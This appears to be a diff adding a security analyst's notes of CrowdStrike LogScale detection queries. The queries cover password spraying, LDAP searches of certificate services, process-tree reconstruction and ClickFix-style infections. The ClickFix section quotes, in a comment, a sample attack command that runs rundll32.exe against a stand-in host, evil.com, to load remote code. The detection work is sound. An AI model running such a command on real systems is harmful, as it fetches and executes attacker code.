+    #event_simpleName="UserLogonFailed2" | user.name := UserName | _victim_ip := LocalAddressIP4 | _domain_ := LogonDomain | attacker_host := RemoteAddressIP4 | _logon_failed_1 := true;
+    #event_simpleName="ActiveDirectoryServiceAccessRequestFailure" | user.name := SourceAccountSamAccountName | _victim_ip := TargetServerAddressIP4 | _domain_ := SourceAccountDomain | _logon_failed_2 := true;
+    }
+| _domain_ := lower(_domain_)
+| user.name := lower(user.name)
+| selfJoinFilter(field=[_domain_, _victim_ip],
+    where=[
+        { _logon_failed_1="true" },
+        { _logon_failed_2="true" }
+    ]
+)
+| case {
+    ActiveDirectoryAuthenticationMethod=0 | _auth_method_ := "Kerberos";
+    ActiveDirectoryAuthenticationMethod=3 | _auth_method_ := "SIMPLE BIND";
+    in(field="ActiveDirectoryAuthenticationMethod", values=[1,2,5]) | _auth_method_ := "NTLM";
+    *;
+}
+| case {
+    ActiveDirectoryDataProtocol=0 | _protocol_ := "LDAP";
+    ActiveDirectoryDataProtocol=1 | _protocol_ := "DCE_RPC";
+    ActiveDirectoryDataProtocol=2 | _protocol_ := "RDP";
+    in(field="ActiveDirectoryDataProtocol", values=[3,4,5,6,7,8,9]) | _protocol_ := "SMB";
+    *;
+}
+| case{
+    TargetServiceAccessClassification=1 | _target_service_ := "LDAP";
+    TargetServiceAccessClassification=2 | _target_service_ := "WEB";
+    TargetServiceAccessClassification=3 | _target_service_ := "FILE_SHARE";
+    TargetServiceAccessClassification=4 | _target_service_ := "DB";
+    TargetServiceAccessClassification=5 | _target_service_ := "RPCSS";
+    TargetServiceAccessClassification=6 | _target_service_ := "REMOTE_DESKTOP";
+    TargetServiceAccessClassification=7 | _target_service_ := "SCCM";
+    TargetServiceAccessClassification=8 | _target_service_ := "SIP";
+    TargetServiceAccessClassification=9 | _target_service_ := "DNS";
+    TargetServiceAccessClassification=10 | _target_service_ := "MAIL";
+    TargetServiceAccessClassification=11 | _target_service_ := "COMPUTER_ACCESS";
+    TargetServiceAccessClassification=12 | _target_service_ := "SERVICE_ACCOUNT";
+    TargetServiceAccessClassification=13 | _target_service_ := "UNKNOWN";
+    *;
+}
+
+
+
+| groupBy([_victim_ip, _domain_, SourceEndpointHostName, TargetServerHostName],
+    function=[
+        collect([event_platform, attacker_host, _target_service_, _auth_method_, _protocol_]),
+        collect([SourceAccountUserName]), collect([error.code]),
+        count(SourceAccountUserName, distinct=true, as="distictUserNameCnt"),
+        sum(AggregationActivityCount, as="distictAttemptsCnt")
+    ]
+)
+// Tune the detection based on your environment activity
+| distictUserNameCnt > 15 OR distictAttemptsCnt > 20
+
+```
+
+
+# Detect suspicious LDAP searches targeting Active Directory Certificate Services configurations
+
+```
+
+// Detect suspicious LDAP searches targeting Active Directory Certificate Services configurations
+#event_simpleName=ActiveDirectoryIncomingLdapSearchRequest
+// Filter for ADCS-related search patterns in the filter or base object
+| LdapSearchFilterSample=/(?i)(pKI|certificate|msPKI|Enrollment|CA)/i OR LdapSearchBaseObjectSample=/(?i)(Public Key Services|Certificate Templates|Enrollment Services|Certification Authority)/i OR LdapSearchAttributes=/(?i)(pKI|certificate|msPKI)/i
+// Select relevant fields for investigation
+| table([
+    @timestamp,
+    ComputerName,
+    SourceEndpointHostName,
+    SourceEndpointAddressIP4,
+    SourceAccountUserName,
+    SourceAccountUserPrincipal,
+    SourceAccountType,
+    LdapSearchBaseObjectSample,
+    LdapSearchFilterSample,
+    LdapSearchAttributes,
+    LdapSearchScope,
+    ActiveDirectoryAuthenticationMethod,
+    AggregationActivityCount,
+    LdapSearchQueryToken
+])
+
+
+```
+
+
+# claude tells us everything
+
+Field	                    What it is
+`TargetProcessId`	        The PID of the process that caused this event
+`ContextProcessId`	        The PID of the process that was active when the event fired
+`ParentProcessId`	        The PID of the parent that spawned the process
+`RootProcessId`	            The PID at the very top of the tree
+`ContextThreadId`	        The thread that generated the event
+
+
+```
+// FILTER RESULTS
+// | DomainName = /veryinterestingdomainname/i
+/* 
+  TargetProcessId   The PID of the process that caused this event
+  ContextProcessId  The PID of the process that was active when the event fired
+  ParentProcessId   The PID of the parent that spawned the process
+  RootProcessId     The PID at the very top of the tree
+  ContextThreadId	  The thread that generated the event
+*/
+// ================================================================
+// PREAMBLE — defineTable must come first, before any filters
+// ================================================================
+defineTable(
+    name="getParentProcess",
+    query={
+        #event_simpleName=ProcessRollup2
+        | select([TargetProcessId, ContextProcessId, ImageFileName, CommandLine, ParentProcessId, UserName])
+        | rename(field=TargetProcessId, as=lookupPID)
+        | rename(field=ImageFileName, as=ParentImageFileName)
+        | rename(field=CommandLine, as=ParentCommandLine)
+        | rename(field=UserName, as=ParentUserName)
+        | rename(field=#event_simpleName, as=ParentSimpleName)
+    },
+    include=[lookupPID, ParentImageFileName, ParentCommandLine, ParentUserName, ParentSimpleName, ParentProcessId]
+)
+
+// ================================================================
+// PRIMARY QUERY — your anchor event
+// ================================================================
+| DomainName = /lachyisawesomeandadamisheretoo/i
+| sort(field=@timestamp, limit=1)
+
+// Normalise the falconPID — coalesce TargetProcessId or ContextProcessId
+| falconPID := ContextProcessId
+
+// ================================================================
+// MATCH — join anchor event back to the ProcessRollup2 table
+// field=  the field on the PRIMARY side to match on
+// column= the field in the TABLE to match against
+// strict=false means keep the event even if no match found
+// ================================================================
+| match(
+    table=getParentProcess,
+    field=falconPID,
+    column=lookupPID,
+    strict=false
+)
+// ================================================================
+// OUTPUT
+// ================================================================
+| table(
+    fields=[
+        ComputerName, UserName, aid, aip,
+        FileName, FilePath,
+        falconPID, ContextProcessId, TargetProcessId,
+        ParentProcessId, RootProcessId, ContextThreadId,
+        ParentSimpleName,
+        ParentImageFileName, ParentCommandLine, ParentUserName
+    ],
+    limit=100
+)
+
+
+
+```
+
+
+```
+// ContextProcessId = 164251945279 | groupBy([ParentProcessId, TargetProcessId])
+// ParentProcessId = 164246068005 | groupBy([ParentProcessId, TargetProcessId])
+
+| DomainName = /lachyisawesomeandadamisheretoo/i
+//ContextProcessId
+
+```
+
+# event_simpleName detection and find all processes running under that processid
+
+
+```
+$ucq-repo-crowdstrike()
+//LIMIT OUR SCOPE FOR SPEED --> ALSO REDUCE TIME PERIOD
+| ComputerName = /UCQ-CYBER-P002/i
+
+
+
+
+
+/* 
+  SIMPLE EXPLAINATION :) had to use ai cause I am still not 100% sure of it
+  CrowdStrike uses different field names to refer to "the process involved" depending on the event type
+
+  Event Type            Field that holds the process ID
+  ProcessRollup2        TargetProcessId
+  NetworkConnectIP4     ContextProcessId
+  FileWritten           ContextProcessId
+  DnsRequest            ContextProcessId
+
+  So when you want to join or match events across types, you need a single consistent field to join on. That's what falconPID is — a normalised alias.
+
+  TargetProcessId  ──┐
+                     ├──► falconPID  (one consistent field to rule them all)
+  ContextProcessId ──┘
+
+  You create it so your downstream join, match, or table steps don't need to care which event type they're dealing with — they just reference falconPID and it always works
+  aka magic
+*/
+| falconPID := ContextProcessId | falconPID := TargetProcessId
+| default(field=detection, value="false")
+//NOTE: selfJoinFilter runs BEFORE the outer query so this DomainName search is rooly quick
+| selfJoinFilter(field=[aid, falconPID], where=[{DomainName=/ransomware.live/i}], prefilter=false)
+// show the hit
+| case { DomainName = /ransomware.live/i | detection := "HIT" ; * | detection := "-" }
+| eval(ActivityTarget=coalesce([TargetFileName, DomainName, RemoteAddressIP4, FileName]))
+// #HACK timestamps are to the millisecond but sometimes dont order nicely. EndOfProcess has a field to hardcode to b
+| default(field=alwaysLast, value="a")
+// TREEVIEW?
+| default(field="tree", value=" ├──")
+// MAKE IT PRETTY
+| case {
+    #event_simpleName=/ProcessRollup2/i     | verbose := format(format="CMD: %s", field=[CommandLine]) | tree:=FileName ;
+    #event_simpleName=/dns/i                | verbose := format(format="DNS: %s", field=[DomainName]) ;  //  ioc:lookup(field=[DomainName], type=domain, confidenceThreshold=Unverified) |
+    #event_simpleName=/network/i            | asn(field=RemoteAddressIP4) | verbose := format(format="CONN: %s:%s (%s)", field=[RemoteAddressIP4, RemotePort, RemoteAddressIP4.org]) ;
+    #event_simpleName=/file/i               | verbose := format(format="WRITE: %s", field=[TargetFileName]) ;
+    #event_simpleName=/UserLogon/i          | verbose := format(format="LOGON: %s (Type %s) to %s", field=[UserName, AuthenticationPackage, LogonServer]) ;
+    #event_simpleName=/UserIdentity/i       | verbose := format(format="USER: %s (%s)", field=[UserName, UserSid]) ;
+    #event_simpleName=/EndOfProcess/i       | verbose := format(format="EXIT: %s (Duration: %sms)", field=[ExitCode, ProcessDuration_decimal]) | tree:=" └──" | alwaysLast:="b";
+    *                                       | verbose := format(format="Other: %s", field=[#event_simpleName])
+  }
+
+
+// OUTPUT AS A TABLE WITH SOME SORTING AND SOME DROPPING
+| table([tree, @timestamp, ComputerName, UserName, #event_simpleName, detection, verbose], limit=max)
+//| table([@timestamp, falconPID, ParentProcessId, TargetProcessId, ContextProcessId, #event_simpleName, ImageFileName, CommandLine], limit=max)
+| sort([@timestamp, alwaysLast], order=asc, limit=max) | drop(fields=[@rawstring, alwaysLast])
+```
+
+
+# clickfix
+
+```
+// detection logic in the defineTable, the event details we want are in the query root
+defineTable(
+  name="detections",
+  query={
+    #event_simpleName = ProcessRollup2
+    | (
+        //CommandLine = /rundll32.exe \\\\/i // DETECTION "C:\Windows\system32\cmd.exe" /c "" start rundll32.exe \\evil.com,#1 ZG82Qx44
+        //OR 
+        (ComputerName = WVA2013893 AND CommandLine = /hostname/i) // detection test, looking for hostname executed on the commandline. The "suspicious" domain is ransomeware.live 
+      )
+    | detectionTime := @timestamp
+    | trigger := CommandLine
+    | groupBy([detectionTime, trigger, aid, ComputerName])
+  }, include=[aid, ComputerName, detectionTime, trigger]
+)
+
+// get all the dns hits
+| #event_simpleName = /dns/i
+// matched against the aid of a detection
+| match(table=detections, field=[aid])
+// delta milliseconds between the detectionTime of the trigger and our dns lookups
+| delta := detectionTime - @timestamp
+// delta must be greater than zer but less than 600000 milliseconds (10 mins)
+| test(delta >= 0) | test(delta <= 600000)
+| groupby([detectionTime, @timestamp, ComputerName, trigger], function=[collect([DomainName])])
+| formatTime(format="%Y/%m/%d %H:%M:%S ", as="detectionTime", field=detectionTime, timezone="Australia/Brisbane")
+| rename(field="DomainName", as="PotentiallyCompromisedDomain")
+
+```
+
+
+
